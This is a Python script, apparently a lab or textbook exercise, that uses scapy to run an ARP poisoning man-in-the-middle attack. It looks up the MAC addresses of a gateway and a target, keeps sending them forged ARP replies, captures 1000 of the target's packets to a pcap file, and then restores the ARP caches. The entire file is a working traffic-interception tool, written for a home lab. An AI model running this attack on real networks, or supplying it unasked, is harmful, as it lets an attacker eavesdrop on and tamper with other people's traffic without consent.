from scapy.all import *
import os
import sys
import threading
import signal

if os.name == "nt":
    # Windows host attacking Linux VM.
    INTERFACE    = 'Intel(R) Ethernet Connection (2) I219-V'
    TARGET_IP    = "192.168.1.115"
else:
    # Linux VM host attacking Windows.
    INTERFACE = 'eth0'
    TARGET_IP = "192.168.1.114"

GATEWAY_IP   = "192.168.1.1"
PACKET_COUNT = 1000


def restore_target(gateway_ip, gateway_mac, target_ip, target_mac):
    # Slightly different method using send
    # Send ARP packets to the network broadcast address to reset the ARP caches of the gateway and target machines.
    print("[*] Restoring target...")
    send(ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gateway_mac), count=5)
    send(ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=target_mac), count=5)

    # Signal the main thread to exit
    os.kill(os.getpid(), signal.SIGINT)


def get_mac(ip_address):
    # Use the send and receive packet function to emit an ARP request to the specified IP address in order to
    # resolve the MAC address associated with it.
    response, unanswered = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip_address), timeout=2, retry=10)

    # Return the MAC address from a response
    for s, r in response:
        return r[Ether].src
    return None


def poison_target(gateway_ip, gateway_mac, target_ip, target_mac):
    poison_target = ARP()
    poison_target.op = 2
    poison_target.psrc = gateway_ip
    poison_target.pdst = target_ip
    poison_target.hwdst = target_mac

    poison_gateway = ARP()
    poison_gateway.op = 2
    poison_gateway.psrc = target_ip
    poison_gateway.pdst = gateway_ip
    poison_gateway.hwdst = gateway_mac

    print("[*] Beginning the ARP poison. [CTRL-C to stop]")

    # Emit poisoned ARP requests to make sure that the respective ARP cache entries remain poisoned for
    # the duration of our attach.
    while True:
        try:
            send(poison_target)
            send(poison_gateway)
            time.sleep(2)
        except KeyboardInterrupt:
            restore_target(gateway_ip, gateway_mac, target_ip, target_mac)

    print("[*] ARP poison attack finished.")


if __name__ == "__main__":

    # Set our interface
    conf.iface = INTERFACE

    # Turn off output
    conf.verb = 0

    print("[*] Setting up {}".format(INTERFACE))

    gateway_mac = get_mac(GATEWAY_IP)

    if gateway_mac is None:
        sys.exit("[!!!] Failed to get gateway MAC. Exiting.")
    else:
        print("[*] Gateway {} is @ {}".format(GATEWAY_IP, gateway_mac))

    target_mac = get_mac(TARGET_IP)

    if target_mac is None:
        sys.exit("[!!!] Failed to get target MAC. Exiting.")
    else:
        print("[*] Target {} is @ {}".format(TARGET_IP, target_mac))

    # Start ARP poisoning thread
    poison_thread = threading.Thread(target=poison_target, args=(GATEWAY_IP, gateway_mac, TARGET_IP, target_mac))
    poison_thread.start()

    try:
        print("[*] Starting sniffer for {} packets".format(PACKET_COUNT))

        bpf_filter = "ip host {}".format(TARGET_IP)
        packets = sniff(count=PACKET_COUNT, filter=bpf_filter, iface=INTERFACE)

        # Write out captured packets so that we can open them in Wireshark
        wrpcap('arper.pcap', packets)

        # Restore the network
        restore_target(GATEWAY_IP, gateway_mac, TARGET_IP, target_mac)

    except KeyboardInterrupt:
        # Restore the network
        restore_target(GATEWAY_IP, gateway_mac, TARGET_IP, target_mac)
        sys.exit(0)
